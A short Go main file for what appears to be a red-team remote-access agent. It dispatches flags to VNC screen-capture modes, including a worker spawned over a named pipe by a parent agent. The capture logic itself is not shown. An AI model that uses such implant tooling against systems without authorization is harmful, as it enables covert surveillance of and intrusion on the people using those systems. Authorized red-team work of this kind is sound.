package main

import (
	"os"
	"strconv"

	agent "redteam/agents/agent-go"
)

func main() {
	args := os.Args
	if len(args) >= 4 && args[1] == "--vnc-mode" {
		port, _ := strconv.Atoi(args[2])
		quality, _ := strconv.Atoi(args[3])
		if port > 0 {
			agent.RunVNCMode(port, quality)
			return
		}
	}
	// --vnc-worker <pipename> <quality>
	// Spawned by parent agent; connects to parent's named pipe as a VNC capture worker.
	if len(args) >= 4 && args[1] == "--vnc-worker" {
		pipeName := args[2]
		quality, _ := strconv.Atoi(args[3])
		if quality < 1 || quality > 100 {
			quality = 60
		}
		if pipeName != "" {
			agent.RunVNCWorkerMode(pipeName, quality)
		}
		return
	}
	agent.Main()
}
